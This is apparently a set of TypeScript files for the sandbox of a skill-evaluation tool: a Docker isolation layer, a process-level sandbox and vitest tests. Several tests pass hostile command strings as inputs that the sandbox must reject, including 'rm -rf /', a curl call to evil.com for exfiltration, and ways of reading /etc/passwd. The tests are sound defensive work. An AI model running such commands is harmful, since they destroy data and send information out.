/**
 * @file sandbox/DockerSandbox.ts
 * @description Layer 2 — Docker 容器级强隔离沙箱
 *
 * 防护能力（全面覆盖进程沙箱的短板）：
 *   ✅ 独立内核命名空间（PID / NET / MNT / IPC / UTS）
 *   ✅ cgroup v2 内存/CPU/PID 硬限制（OOM Killer 接管）
 *   ✅ 网络完全隔离（--network none）或精细化白名单
 *   ✅ 只读文件系统挂载（--read-only + tmpfs /tmp）
 *   ✅ seccomp-bpf 系统调用白名单过滤
 *   ✅ Linux Capabilities 全部 drop + 精确 add
 *   ✅ 禁止 root 权限提升（--security-opt no-new-privileges）
 *   ✅ 非 root 用户执行（UID/GID 65534 = nobody）
 *   ✅ 容器生命周期管理（自动清理，防止资源泄漏）
 *
 * 依赖：
 *   npm install dockerode @types/dockerode
 */

import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import { Readable } from "node:stream";
import Docker from "dockerode";
import type {
  SandboxConfig,
  SandboxResult,
  ResourceUsageStats,
} from "./types.js";
import {
  SandboxExecutor,
  type JsonRpcRequest,
} from "./SandboxExecutor.js";

// ─── 内部常量 ─────────────────────────────────────────────────────────────────

/** 容器内 Skill 的挂载路径 */
const SKILL_MOUNT_PATH = "/skill" as const;

/** 容器内可写临时目录 */
const TMP_MOUNT_PATH = "/tmp" as const;

/** 非特权用户 UID/GID（nobody） */
const NOBODY_UID = 65534 as const;

/** 容器名前缀（便于识别和清理） */
const CONTAINER_NAME_PREFIX = "eval-skills-sandbox-" as const;

/** 最小允许保留的 Linux Capabilities（Python/Node 脚本通常不需要任何 cap） */
const ALLOWED_CAPABILITIES: string[] = [];

/** 必须 Drop 的高危 Capabilities */
const DROP_CAPABILITIES = ["ALL"] as const;

// ─── 辅助类型 ─────────────────────────────────────────────────────────────────

interface ContainerStats {
  memory_stats: {
    max_usage?: number;
    usage?: number;
    limit?: number;
  };
  cpu_stats: {
    cpu_usage: { total_usage: number };
    system_cpu_usage: number;
    online_cpus?: number;
  };
  precpu_stats: {
    cpu_usage: { total_usage: number };
    system_cpu_usage: number;
  };
}

// ─── DockerSandbox ────────────────────────────────────────────────────────────

export class DockerSandbox extends SandboxExecutor {
  private readonly docker: Docker;

  constructor(config: SandboxConfig) {
    super(config);
    this.docker = new Docker({
      socketPath: config.docker.socketPath ?? "/var/run/docker.sock",
    });
  }

  // ─── 公共接口 ──────────────────────────────────────────────────────────────

  async execute(
    command: string,
    skillDir: string,
    request: JsonRpcRequest,
    signal?: AbortSignal,
  ): Promise<SandboxResult> {
    const startTime = performance.now();

    // ── Step 1: 验证命令 ──────────────────────────────────────────────────
    let parsed;
    try {
      parsed = this.parseAndValidateCommand(command, skillDir);
    } catch (err) {
      return this.makeErrorResult((err as Error).message, "docker", startTime);
    }

    // ── Step 2: 拉取/检查镜像 ────────────────────────────────────────────
    const image = this.config.docker.image;
    try {
      await this.ensureImage(image);
    } catch (err) {
      return this.makeErrorResult(
        `Failed to ensure Docker image "${image}": ${(err as Error).message}`,
        "docker", startTime,
      );
    }

    // ── Step 3: 加载 seccomp profile ─────────────────────────────────────
    const seccompProfile = this.loadSeccompProfile();

    // ── Step 4: 构建容器创建选项 ──────────────────────────────────────────
    const containerName = `${CONTAINER_NAME_PREFIX}${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    const safeEnv = this.buildSafeEnv();
    const envArray = Object.entries(safeEnv).map(([k, v]) => `${k}=${v}`);

    const createOptions = this.buildContainerCreateOptions(
      containerName,
      image,
      parsed,
      skillDir,
      envArray,
      seccompProfile,
    );

    // ── Step 5: 创建容器 ──────────────────────────────────────────────────
    let container: Docker.Container | null = null;
    try {
      container = await this.docker.createContainer(createOptions);
    } catch (err) {
      return this.makeErrorResult(
        `Failed to create container: ${(err as Error).message}`,
        "docker", startTime,
      );
    }

    // ── Step 6: 执行（带完整生命周期管理） ──────────────────────────────
    try {
      return await this.runContainer(
        container,
        request,
        startTime,
        signal,
      );
    } finally {
      // 无论成功/失败/超时，都清理容器
      await this.cleanupContainer(container, containerName);
    }
  }

  /**
   * 检查 Docker Daemon 是否可用
   */
  async isAvailable(): Promise<boolean> {
    try {
      await this.docker.ping();
      return true;
    } catch {
      return false;
    }
  }

  // ─── 私有实现 ──────────────────────────────────────────────────────────────

  /**
   * 构建 Docker 容器创建选项（核心安全配置）
   */
  private buildContainerCreateOptions(
    name: string,
    image: string,
    parsed: { executable: string; args: string[]; cwd: string },
    skillDir: string,
    envArray: string[],
    seccompProfile: string,
  ): Docker.ContainerCreateOptions {
    const { resources, filesystem, network } = this.config;

    // 网络模式
    const networkMode = network === "none" ? "none" : "bridge";

    // 绑定挂载：Skill 目录只读 + /tmp 内存盘
    const binds: string[] = [
      `${path.resolve(skillDir)}:${SKILL_MOUNT_PATH}:ro`,  // 只读挂载
    ];

    // 额外只读路径
    for (const p of filesystem.additionalReadOnlyPaths ?? []) {
      const resolved = path.resolve(p);
      if (fs.existsSync(resolved)) {
        binds.push(`${resolved}:${resolved}:ro`);
      }
    }

    // tmpfs 配置（容器内唯一可写区域）
    const tmpfsConfig: Record<string, string> = {
      [TMP_MOUNT_PATH]: `rw,noexec,nosuid,size=${resources.tmpDiskMb}m`,
    };

    // seccomp 安全选项
    const securityOpts: string[] = [
      "no-new-privileges",            // 禁止提权
      `seccomp=${seccompProfile}`,    // 系统调用白名单
    ];

    if (this.config.docker.rootless) {
      securityOpts.push("rootless");
    }

    // 屏蔽敏感路径
    const maskedPaths = filesystem.maskSensitivePaths
      ? ["/proc/acpi", "/proc/kcore", "/proc/keys", "/proc/latency_stats",
         "/proc/timer_list", "/proc/timer_stats", "/proc/sched_debug",
         "/proc/scsi", "/sys/firmware", "/sys/devices/virtual/powercap"]
      : [];

    return {
      name,
      Image: image,
      // 直接运行解析后的命令，不经过 shell（防止注入）
      Cmd: [parsed.executable, ...parsed.args],
      WorkingDir: SKILL_MOUNT_PATH,
      Env: envArray,
      // 以非特权用户运行
      User: `${NOBODY_UID}:${NOBODY_UID}`,
      // 关闭 TTY 和 stdin 持久
      Tty: false,
      OpenStdin: true,
      StdinOnce: true,
      AttachStdin: true,
      AttachStdout: true,
      AttachStderr: true,
      // 只读根文件系统
      // ReadonlyRootfs: true, // 移到 HostConfig
      NetworkDisabled: network === "none",
      HostConfig: {
        NetworkMode: networkMode,
        Binds: binds,
        Tmpfs: tmpfsConfig,
        ReadonlyRootfs: true, // 在 HostConfig 中启用
        // ── cgroup 资源硬限制 ─────────────────────────────────────────
        Memory: resources.memoryMb * 1024 * 1024,    // bytes
        MemorySwap: resources.memoryMb * 1024 * 1024, // 禁用 swap（swap = memory 即禁用）
        NanoCpus: Math.floor(resources.cpuCores * 1e9), // 1e9 = 1 CPU
        PidsLimit: resources.maxPids,                 // fork bomb 防护
        // ── 安全配置 ─────────────────────────────────────────────────
        SecurityOpt: securityOpts,
        CapDrop: [...DROP_CAPABILITIES] as string[],
        CapAdd: ALLOWED_CAPABILITIES,
        // ── OOM 配置 ─────────────────────────────────────────────────
        OomKillDisable: false,   // 允许 OOM Killer 杀死进程
        OomScoreAdj: 500,        // 提高 OOM 优先级（更容易被 kill）
        // ── 其他安全选项 ─────────────────────────────────────────────
        AutoRemove: false,       // 手动清理，确保我们能获取退出状态
        MaskedPaths: maskedPaths,
        ReadonlyPaths: ["/proc/asound", "/proc/bus", "/proc/fs", "/proc/irq",
                        "/proc/sys", "/proc/sysrq-trigger"],
      },
    };
  }

  /**
   * 运行容器并收集 I/O
   */
  private async runContainer(
    container: Docker.Container,
    request: JsonRpcRequest,
    startTime: number,
    signal?: AbortSignal,
  ): Promise<SandboxResult> {
    const { resources } = this.config;
    let timedOut = false;
    let oomKilled = false;
    let statsSnapshot: ContainerStats | null = null;

    // Attach stdin/stdout/stderr
    const stream = await container.attach({
      stream: true,
      stdin: true,
      stdout: true,
      stderr: true,
    });

    // 启动容器
    await container.start();

    // 开始后台收集资源统计
    const statsPromise = this.collectStats(container).then((s) => {
      statsSnapshot = s;
    }).catch(() => { /* stats 收集失败不影响主流程 */ });

    // ── 流式读取 stdout/stderr ─────────────────────────────────────────
    const stdoutChunks: Buffer[] = [];
    const stderrChunks: Buffer[] = [];
    let stdoutBytes = 0;
    let stderrBytes = 0;
    let outputTruncated = false;
    const halfMax = Math.floor(resources.maxOutputBytes / 2);

    // Docker attach 返回多路复用流，需要 demux
    const demuxPromise = new Promise<void>((resolve, reject) => {
      container.modem.demuxStream(
        stream,
        // stdout 写入 writable
        new (class extends (require("node:stream").Writable) {
          _write(chunk: Buffer, _enc: string, cb: () => void) {
            if (stdoutBytes < halfMax) {
              const take = Math.min(chunk.length, halfMax - stdoutBytes);
              stdoutChunks.push(chunk.subarray(0, take));
              stdoutBytes += take;
              if (take < chunk.length) {
                outputTruncated = true;
              }
            }
            cb();
          }
        })(),
        // stderr 写入 writable
        new (class extends (require("node:stream").Writable) {
          _write(chunk: Buffer, _enc: string, cb: () => void) {
            if (stderrBytes < halfMax) {
              const take = Math.min(chunk.length, halfMax - stderrBytes);
              stderrChunks.push(chunk.subarray(0, take));
              stderrBytes += take;
            }
            cb();
          }
        })(),
      );

      stream.on("end", () => resolve());
      stream.on("error", (err: Error) => reject(err));
    });

    // ── 写入 JSON-RPC 请求 ─────────────────────────────────────────────
    const requestStr = JSON.stringify(request);
    await new Promise<void>((resolve, reject) => {
      stream.write(requestStr, "utf-8", (err?: Error | null) => {
        if (err) reject(err); else resolve();
      });
    });
    stream.end(); // 关闭 stdin

    // ── 硬超时定时器 ───────────────────────────────────────────────────
    const hardTimeoutPromise = new Promise<"timeout">((resolve) => {
      setTimeout(() => resolve("timeout"), resources.hardTimeoutMs);
    });

    // AbortSignal 转 Promise
    const abortPromise = new Promise<"aborted">((resolve) => {
      if (!signal) return;
      if (signal.aborted) { resolve("aborted"); return; }
      signal.addEventListener("abort", () => resolve("aborted"), { once: true });
    });

    // ── 等待容器结束或超时 ─────────────────────────────────────────────
    const waitResult = await Promise.race([
      container.wait().then((r) => ({ type: "exit" as const, statusCode: r.StatusCode })),
      hardTimeoutPromise,
      abortPromise,
    ]);

    // 处理超时 / abort
    if (waitResult === "timeout" || waitResult === "aborted") {
      timedOut = true;
      try {
        await container.kill({ signal: "SIGKILL" });
      } catch { /* 容器可能已退出 */ }
    }

    // 等待流读取完成
    try {
      await Promise.race([demuxPromise, new Promise((_, r) => setTimeout(() => r(new Error("demux timeout")), 3000))]);
    } catch { /* 流超时，继续 */ }

    // 等待 stats 收集完成（超时 1s）
    await Promise.race([statsPromise, new Promise((r) => setTimeout(r, 1000))]);

    // ── 检查 OOM ──────────────────────────────────────────────────────
    try {
      const inspect = await container.inspect();
      oomKilled = inspect.State?.OOMKilled ?? false;
    } catch { /* 容器已被清理 */ }

    const exitCode = typeof waitResult === "object" ? waitResult.statusCode : null;

    // ── 组装结果 ──────────────────────────────────────────────────────
    const stdout = Buffer.concat(stdoutChunks).toString("utf-8");
    const stderr = Buffer.concat(stderrChunks).toString("utf-8");
    const latencyMs = performance.now() - startTime;
    const success = exitCode === 0 && !timedOut && !oomKilled;

    let errorMsg: string | undefined;
    if (timedOut) {
      errorMsg = `Container timed out after ${resources.hardTimeoutMs}ms`;
    } else if (oomKilled) {
      errorMsg = `Container OOM-killed (memory limit: ${resources.memoryMb}MB)`;
    } else if (exitCode !== 0 && exitCode !== null) {
      errorMsg = `Container exited with code ${exitCode}`;
    }

    // ── 构建资源使用统计 ───────────────────────────────────────────────
    let resourceUsage: ResourceUsageStats | undefined;
    if (statsSnapshot) {
      resourceUsage = this.parseStats(statsSnapshot, latencyMs);
    }

    return {
      success,
      stdout,
      stderr,
      exitCode,
      latencyMs,
      timedOut,
      oomKilled,
      outputTruncated,
      resourceUsage,
      runtimeUsed: "docker",
      error: errorMsg,
    };
  }

  /**
   * 异步收集容器资源统计快照
   */
  private async collectStats(container: Docker.Container): Promise<ContainerStats> {
    return new Promise((resolve, reject) => {
      container.stats({ stream: false }, (err, data) => {
        if (err) reject(err);
        else resolve(data as ContainerStats);
      });
    });
  }

  /**
   * 将 Docker stats 数据解析为统一格式
   */
  private parseStats(stats: ContainerStats, wallTimeMs: number): ResourceUsageStats {
    const memBytes = stats.memory_stats?.max_usage ?? stats.memory_stats?.usage ?? 0;

    // CPU 使用率计算（Docker 标准算法）
    const cpuDelta =
      (stats.cpu_stats?.cpu_usage?.total_usage ?? 0) -
      (stats.precpu_stats?.cpu_usage?.total_usage ?? 0);
    const systemDelta =
      (stats.cpu_stats?.system_cpu_usage ?? 0) -
      (stats.precpu_stats?.system_cpu_usage ?? 0);
    const numCpus = stats.cpu_stats?.online_cpus ?? os.cpus().length;
    const cpuPercent =
      systemDelta > 0 ? (cpuDelta / systemDelta) * numCpus : 0;

    return {
      peakMemoryMb: Math.round(memBytes / (1024 * 1024) * 100) / 100,
      avgCpuPercent: Math.round(cpuPercent * 100) / 100,
      wallTimeMs,
    };
  }

  /**
   * 确保镜像存在（按 pullPolicy 决定是否拉取）
   */
  private async ensureImage(imageName: string): Promise<void> {
    const { pullPolicy } = this.config.docker;

    if (pullPolicy === "always") {
      await this.pullImage(imageName);
      return;
    }

    if (pullPolicy === "if-not-present") {
      try {
        await this.docker.getImage(imageName).inspect();
        return; // 镜像已存在，跳过拉取
      } catch {
        // 镜像不存在，执行拉取
        await this.pullImage(imageName);
      }
    }
    // "never": 不拉取，如果镜像不存在则 createContainer 时失败
  }

  /**
   * 拉取 Docker 镜像（带进度事件）
   */
  private pullImage(imageName: string): Promise<void> {
    return new Promise((resolve, reject) => {
      this.docker.pull(imageName, (err: Error | null, stream: NodeJS.ReadableStream) => {
        if (err) { reject(err); return; }

        this.docker.modem.followProgress(
          stream as Readable,
          (pullErr: Error | null) => {
            if (pullErr) reject(pullErr);
            else {
              this.emit("image-pulled", { image: imageName });
              resolve();
            }
          },
          (event: { status?: string; progress?: string }) => {
            this.emit("image-pull-progress", event);
          },
        );
      });
    });
  }

  /**
   * 加载 seccomp 配置文件（内置 or 自定义）
   */
  private loadSeccompProfile(): string {
    const customPath = this.config.docker.seccompProfilePath;

    if (customPath) {
      if (!fs.existsSync(customPath)) {
        throw new Error(`seccomp profile not found: ${customPath}`);
      }
      return fs.readFileSync(customPath, "utf-8");
    }

    // 使用内置的 eval-skills seccomp profile
    const builtinPath = path.join(
      path.dirname(new URL(import.meta.url).pathname),
      "seccomp-profile.json",
    );

    if (fs.existsSync(builtinPath)) {
      return fs.readFileSync(builtinPath, "utf-8");
    }

    // 降级：返回 "unconfined"（记录警告）
    this.emit("security-warning", {
      message: "seccomp profile not found, running unconfined",
    });
    return "unconfined";
  }

  /**
   * 清理容器（停止 + 删除）
   * 无论执行结果如何都必须调用，防止僵尸容器堆积
   */
  private async cleanupContainer(
    container: Docker.Container,
    name: string,
  ): Promise<void> {
    const timeout = this.config.docker.cleanupTimeoutMs;

    const doCleanup = async () => {
      try {
        // 先 stop（给容器 1s 优雅退出）
        await container.stop({ t: 1 }).catch(() => {});
        // 再 remove（force=true 确保删除）
        await container.remove({ force: true, v: true });
        this.emit("container-cleaned", { name });
      } catch {
        // 清理失败不影响主流程，但记录以便后续排查
        this.emit("cleanup-failed", { name });
      }
    };

    await Promise.race([
      doCleanup(),
      new Promise<void>((resolve) => setTimeout(resolve, timeout)),
    ]);
  }
}

import { describe, it, expect } from "vitest";
import { ProcessSandbox } from "./ProcessSandbox.js";
import { DEFAULT_SANDBOX_CONFIG, SandboxConfig } from "./types.js";
import * as path from "node:path";
import * as os from "node:os";
import * as fs from "node:fs";

describe("ProcessSandbox", () => {
  const tmpDir = os.tmpdir();
  const testConfig: SandboxConfig = {
    ...DEFAULT_SANDBOX_CONFIG,
    runtime: "process",
    filesystem: {
        ...DEFAULT_SANDBOX_CONFIG.filesystem,
        allowPaths: [tmpDir] // Allow access to tmp dir for testing if needed
    }
  };

  // Track created files for cleanup
  const createdFiles: string[] = [];

  function createScript(name: string, content: string): string {
      const p = path.join(tmpDir, name);
      fs.writeFileSync(p, content);
      createdFiles.push(p);
      return p;
  }

  afterEach(() => {
      for (const p of createdFiles) {
          try {
              if (fs.existsSync(p)) fs.unlinkSync(p);
          } catch {}
      }
      createdFiles.length = 0;
  });

  it("should execute a simple command successfully", async () => {
    const scriptPath = createScript("test-success.js", "console.log('hello sandbox')");

    const sandbox = new ProcessSandbox(testConfig);
    const result = await sandbox.execute(
      `node ${scriptPath}`,
      tmpDir,
      { jsonrpc: "2.0", method: "test", params: {}, id: 1 }
    );
    if (!result.success) {
        console.error("Execution failed:", result.error);
        console.error("Stdout:", result.stdout);
        console.error("Stderr:", result.stderr);
    }

    expect(result.success).toBe(true);
    expect(result.stdout).toContain("hello sandbox");
    expect(result.exitCode).toBe(0);
  });

  it("should handle timeout", async () => {
    const scriptPath = createScript("test-timeout.js", "setTimeout(() => {}, 2000);");

    const configWithTimeout = {
        ...testConfig,
        resources: {
            ...testConfig.resources,
            hardTimeoutMs: 100 // Short timeout
        }
    };
    const sandbox = new ProcessSandbox(configWithTimeout);
    const result = await sandbox.execute(
      `node ${scriptPath}`,
      tmpDir,
      { jsonrpc: "2.0", method: "test", params: {}, id: 1 }
    );

    expect(result.success).toBe(false);
    expect(result.timedOut).toBe(true);
    expect(result.error).toContain("timed out");
  });

  it("should block disallowed executables", async () => {
    // perl is not in the allowed list
    const scriptPath = createScript("test.pl", "print 1;");

    const sandbox = new ProcessSandbox(testConfig);
    const result = await sandbox.execute(
      `perl ${scriptPath}`,
      tmpDir,
      { jsonrpc: "2.0", method: "test", params: {}, id: 1 }
    );

    expect(result.success).toBe(false);
    expect(result.error).toContain("not allowed");
  });

  it("should truncate output", async () => {
      const scriptPath = createScript("test-truncate.js", "console.log('123456789012345')");

      const configWithLimit = {
          ...testConfig,
          resources: {
              ...testConfig.resources,
              maxOutputBytes: 10 // Very small limit
          }
      };
      const sandbox = new ProcessSandbox(configWithLimit);
      const result = await sandbox.execute(
        `node ${scriptPath}`,
        tmpDir,
        { jsonrpc: "2.0", method: "test", params: {}, id: 1 }
      );

      expect(result.outputTruncated).toBe(true);
  });
});

/**
 * @file sandbox/ProcessSandbox.ts
 * @description Layer 1 — 进程级沙箱（跨平台，零额外依赖）
 *
 * 防护能力：
 *   ✅ 命令注入防护（可执行程序白名单 + 特殊字符过滤）
 *   ✅ 路径遍历防护（路径归一化 + 边界检查）
 *   ✅ 环境变量过滤（白名单透传）
 *   ✅ 输出大小限制（按字节截断）
 *   ✅ 硬超时 + 进程树强制销毁（防止僵尸进程）
 *   ✅ 内存限制（Linux: ulimit -v；macOS: 仅记录）
 *   ⚠️  网络隔离：仅记录警告，无法强制阻断（需升级 DockerSandbox）
 *   ⚠️  文件系统隔离：基于路径校验，非内核级别隔离
 *
 * 原理：
 *   1. 在独立进程组（detached: true）中启动 Skill 进程
 *   2. Linux 通过 ulimit -v 设置虚拟内存上限
 *   3. 通过 process.kill(-pgid, SIGKILL) 销毁整个进程树
 *   4. 流式读取 stdout/stderr，达到 maxOutputBytes 即截断
 */

import { spawn } from "node:child_process";
import * as os from "node:os";
import type { SandboxConfig, SandboxResult } from "./types.js";
import {
  SandboxExecutor,
  type JsonRpcRequest,
} from "./SandboxExecutor.js";

export class ProcessSandbox extends SandboxExecutor {
  constructor(config: SandboxConfig) {
    super(config);
  }

  async execute(
    command: string,
    skillDir: string,
    request: JsonRpcRequest,
    signal?: AbortSignal,
  ): Promise<SandboxResult> {
    const startTime = performance.now();

    // ── Step 1: 验证并解析命令 ─────────────────────────────────────────────
    let parsed;
    try {
      parsed = this.parseAndValidateCommand(command, skillDir);
    } catch (err) {
      return this.makeErrorResult(
        (err as Error).message, "process", startTime,
      );
    }

    // ── Step 2: 检查网络策略（ProcessSandbox 无法强制，仅警告） ─────────────
    if (this.config.network === "none") {
      // 我们无法在进程级别阻断网络，记录一条安全警告
      this.emit("security-warning", {
        message: "ProcessSandbox cannot enforce network isolation. " +
          "Use DockerSandbox for strict network control.",
        skillDir,
      });
    }

    // ── Step 3: 构建安全环境变量 ───────────────────────────────────────────
    const safeEnv = this.buildSafeEnv();

    // ── Step 4: 构建 Linux 资源限制包装命令 ──────────────────────────────────
    const { executable, args, cwd } = parsed;
    const { resources } = this.config;

    let finalExec = executable;
    let finalArgs = [...args];

    if (os.platform() === "linux") {
      // 使用 bash -c 包装，通过 ulimit 设置内存限制
      // ulimit -v: 虚拟内存上限（KB）
      const memLimitKb = resources.memoryMb * 1024;
      const shellCmd =
        `ulimit -v ${memLimitKb}; ` +
        `exec ${[executable, ...args].map((a) => JSON.stringify(a)).join(" ")}`;
      finalExec = "bash";
      finalArgs = ["-c", shellCmd];
    }

    // ── Step 5: 启动子进程（独立进程组，用于后续整树 kill） ─────────────────
    const child = spawn(finalExec, finalArgs, {
      cwd,
      env: safeEnv,
      stdio: ["pipe", "pipe", "pipe"],
      // detached=true: 在新进程组中启动，便于通过 -pgid 杀死整个进程树
      detached: true,
    });

    // ── Step 6: 并发读取 stdout/stderr（流式，内存安全） ─────────────────────
    const stdoutChunks: Buffer[] = [];
    const stderrChunks: Buffer[] = [];
    let stdoutBytes = 0;
    let stderrBytes = 0;
    let stdoutTruncated = false;
    const maxBytes = resources.maxOutputBytes;
    const halfMax = Math.floor(maxBytes / 2); // stdout/stderr 各占一半

    child.stdout.on("data", (chunk: Buffer) => {
      if (stdoutBytes < halfMax) {
        const take = Math.min(chunk.length, halfMax - stdoutBytes);
        stdoutChunks.push(chunk.subarray(0, take));
        stdoutBytes += take;
        if (take < chunk.length) {
          stdoutTruncated = true;
          this.recordViolation("output_truncated", "warn",
            `stdout exceeded ${halfMax} bytes, truncated`);
        }
      }
    });

    child.stderr.on("data", (chunk: Buffer) => {
      if (stderrBytes < halfMax) {
        const take = Math.min(chunk.length, halfMax - stderrBytes);
        stderrChunks.push(chunk.subarray(0, take));
        stderrBytes += take;
      }
    });

    // ── Step 7: 写入 JSON-RPC 请求到 stdin ────────────────────────────────
    const requestStr = JSON.stringify(request);
    child.stdin.write(requestStr, "utf-8");
    child.stdin.end();

    // ── Step 8: 设置硬超时 + AbortSignal 监听 ────────────────────────────
    let timedOut = false;
    let oomKilled = false;

    /**
     * 强制销毁整个进程树
     * 先发 SIGTERM（优雅关闭，300ms 宽限期），再发 SIGKILL
     */
    const forceKill = async (reason: string) => {
      try {
        if (child.pid !== undefined) {
          // 发送给整个进程组（负号 = 进程组 ID）
          process.kill(-child.pid, "SIGTERM");
        }
      } catch { /* 进程可能已经退出 */ }

      // 等待 300ms 后强制 SIGKILL
      await new Promise<void>((resolve) => {
        setTimeout(() => {
          try {
            if (child.pid !== undefined) {
              process.kill(-child.pid, "SIGKILL");
            }
          } catch { /* 忽略 "process not found" 错误 */ }
          resolve();
        }, 300);
      });

      this.emit("process-killed", { pid: child.pid, reason });
    };

    // 硬超时定时器
    const hardTimeout = setTimeout(async () => {
      timedOut = true;
      await forceKill(`hard timeout (${resources.hardTimeoutMs}ms)`);
    }, resources.hardTimeoutMs);

    // AbortSignal 监听（来自 TaskExecutor 的软超时）
    const onAbort = async () => {
      timedOut = true;
      await forceKill("aborted by signal");
    };
    signal?.addEventListener("abort", onAbort, { once: true });

    // ── Step 9: 等待进程结束 ──────────────────────────────────────────────
    const exitCode = await new Promise<number | null>((resolve) => {
      child.on("close", (code, killSignal) => {
        clearTimeout(hardTimeout);
        signal?.removeEventListener("abort", onAbort);

        // 检测 OOM kill（Linux 中 SIGKILL 后退出码为 -9 或 null）
        if (killSignal === "SIGKILL" && !timedOut) {
          oomKilled = true;
        }
        resolve(code);
      });

      child.on("error", (err) => {
        clearTimeout(hardTimeout);
        signal?.removeEventListener("abort", onAbort);
        this.emit("spawn-error", { error: err.message });
        resolve(null);
      });
    });

    // ── Step 10: 组装结果 ─────────────────────────────────────────────────
    const stdout = Buffer.concat(stdoutChunks).toString("utf-8");
    const stderr = Buffer.concat(stderrChunks).toString("utf-8");
    const latencyMs = performance.now() - startTime;

    const success = exitCode === 0 && !timedOut && !oomKilled;

    let errorMsg: string | undefined;
    if (timedOut) {
      errorMsg = `Process timed out after ${resources.hardTimeoutMs}ms`;
    } else if (oomKilled) {
      errorMsg = `Process killed due to memory limit (${resources.memoryMb}MB)`;
    } else if (exitCode !== 0 && exitCode !== null) {
      errorMsg = `Process exited with code ${exitCode}${stderr ? `: ${stderr.trim().slice(0, 200)}` : ""}`;
    }

    return {
      success,
      stdout,
      stderr,
      exitCode,
      latencyMs,
      timedOut,
      oomKilled,
      outputTruncated: stdoutTruncated,
      runtimeUsed: "process",
      error: errorMsg,
    };
  }
}

/**
 * @file sandbox/SandboxExecutor.test.ts
 * @description 单元测试：输入验证、环境变量过滤、输出截断
 */

import { describe, it, expect, vi } from "vitest";
import { SandboxFactory } from "./SandboxFactory.js";
import { DEFAULT_SANDBOX_CONFIG } from "./types.js";
import type { SandboxConfig } from "./types.js";

// ── 测试用最小配置 ─────────────────────────────────────────────────────────────
const TEST_CONFIG: SandboxConfig = {
  ...DEFAULT_SANDBOX_CONFIG,
  runtime: "process",
  resources: {
    ...DEFAULT_SANDBOX_CONFIG.resources,
    hardTimeoutMs: 5_000,
    memoryMb: 128,
    maxOutputBytes: 1024,
  },
};

describe("SandboxFactory", () => {
  it("mergeWithDefaults should fill in missing fields", () => {
    const merged = SandboxFactory.mergeWithDefaults({
      runtime: "process",
      resources: { memoryMb: 512 } as any,
    });
    expect(merged.runtime).toBe("process");
    expect(merged.resources.memoryMb).toBe(512);
    // 其余字段来自默认值
    expect(merged.resources.maxPids).toBe(DEFAULT_SANDBOX_CONFIG.resources.maxPids);
    expect(merged.network).toBe("none");
  });

  it("createProcessSandbox should return ProcessSandbox", () => {
    const sandbox = SandboxFactory.createProcessSandbox();
    expect(sandbox.constructor.name).toBe("ProcessSandbox");
  });
});

describe("ProcessSandbox — command validation", () => {
  it("should reject command with shell injection characters", async () => {
    const sandbox = SandboxFactory.createProcessSandbox(TEST_CONFIG);
    const result = await sandbox.execute(
      "python3; rm -rf /",
      "/tmp",
      { jsonrpc: "2.0", method: "invoke", params: {}, id: 1 },
    );
    expect(result.success).toBe(false);
    expect(result.error).toContain("injection");

    const violations = sandbox.getViolations();
    expect(violations.some((v) => v.type === "command_injection")).toBe(true);
  });

  it("should reject command with path traversal", async () => {
    const sandbox = SandboxFactory.createProcessSandbox(TEST_CONFIG);
    const result = await sandbox.execute(
      "python3 ../../etc/passwd",
      "/tmp/skill",
      { jsonrpc: "2.0", method: "invoke", params: {}, id: 1 },
    );
    expect(result.success).toBe(false);

    const violations = sandbox.getViolations();
    // path traversal 或者 injection 其中之一被触发
    expect(
      violations.some(
        (v) => v.type === "command_injection" || v.type === "path_traversal",
      ),
    ).toBe(true);
  });

  it("should reject non-whitelisted executable", async () => {
    const sandbox = SandboxFactory.createProcessSandbox(TEST_CONFIG);
    const result = await sandbox.execute(
      "curl http://evil.com/exfil",
      "/tmp",
      { jsonrpc: "2.0", method: "invoke", params: {}, id: 1 },
    );
    expect(result.success).toBe(false);
    expect(result.error).toContain("Command blocked due to potential injection");
  });

  it("should block backtick injection", async () => {
    const sandbox = SandboxFactory.createProcessSandbox(TEST_CONFIG);
    const result = await sandbox.execute(
      "python3 `cat /etc/passwd`",
      "/tmp",
      { jsonrpc: "2.0", method: "invoke", params: {}, id: 1 },
    );
    expect(result.success).toBe(false);
    expect(result.error).toContain("injection");
  });
});

describe("ProcessSandbox — environment variable filtering", () => {
  it("should strip sensitive env vars not in allowList", () => {
    process.env.OPENAI_API_KEY = "sk-secret-key";
    process.env.AWS_SECRET_ACCESS_KEY = "aws-secret";

    const sandbox = SandboxFactory.createProcessSandbox({
      ...TEST_CONFIG,
      env: {
        allowList: ["PATH"],  // 只允许 PATH，不允许 API keys
        inject: {},
      },
    });

    // buildSafeEnv 是 protected，通过反射测试
    const safeEnv = (sandbox as any).buildSafeEnv() as Record<string, string>;

    expect(safeEnv["OPENAI_API_KEY"]).toBeUndefined();
    expect(safeEnv["AWS_SECRET_ACCESS_KEY"]).toBeUndefined();
    expect(safeEnv["PATH"]).toBeDefined();

    delete process.env.OPENAI_API_KEY;
    delete process.env.AWS_SECRET_ACCESS_KEY;
  });

  it("should inject forced env vars even if not in allowList", () => {
    const sandbox = SandboxFactory.createProcessSandbox({
      ...TEST_CONFIG,
      env: {
        allowList: ["PATH"],
        inject: { CUSTOM_CONFIG: "test-value" },
      },
    });

    const safeEnv = (sandbox as any).buildSafeEnv() as Record<string, string>;
    expect(safeEnv["CUSTOM_CONFIG"]).toBe("test-value");
  });

  it("should warn and skip env vars with sensitive patterns even if in allowList", () => {
    process.env.MY_API_KEY = "some-key";

    const sandbox = SandboxFactory.createProcessSandbox({
      ...TEST_CONFIG,
      env: {
        allowList: ["PATH", "MY_API_KEY"],  // 白名单中包含敏感词
        inject: {},
      },
    });

    const violations: any[] = [];
    sandbox.on("violation", (v: any) => violations.push(v));

    const safeEnv = (sandbox as any).buildSafeEnv() as Record<string, string>;
    expect(safeEnv["MY_API_KEY"]).toBeUndefined();
    expect(violations.some((v) => v.type === "env_leak")).toBe(true);

    delete process.env.MY_API_KEY;
  });
});

